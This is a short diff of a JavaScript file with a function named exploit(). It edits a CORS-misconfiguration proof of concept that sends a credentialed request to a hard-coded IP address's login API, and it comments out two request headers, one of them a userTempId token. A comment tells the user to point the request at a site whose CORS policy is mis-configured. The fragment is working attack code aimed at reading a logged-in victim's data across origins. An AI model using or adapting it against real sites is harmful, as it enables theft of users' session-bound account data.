@@ -51,8 +51,8 @@ function exploit() {
       }
  };
  xhttp.open("GET", "http://139.224.42.111/api/user/passport/login", true); //change the URL to the one which has mis-configured CORS policy
- xhttp.setRequestHeader("userTempId", "0b5c72e4-eae9-423d-88ae-ed8df5c36683"); 
- xhttp.setRequestHeader("Content-Type", "application/json");
+ //xhttp.setRequestHeader("userTempId", "0b5c72e4-eae9-423d-88ae-ed8df5c36683"); 
+ //xhttp.setRequestHeader("Content-Type", "application/json");
  xhttp.withCredentials = true;
  xhttp.send();
 }
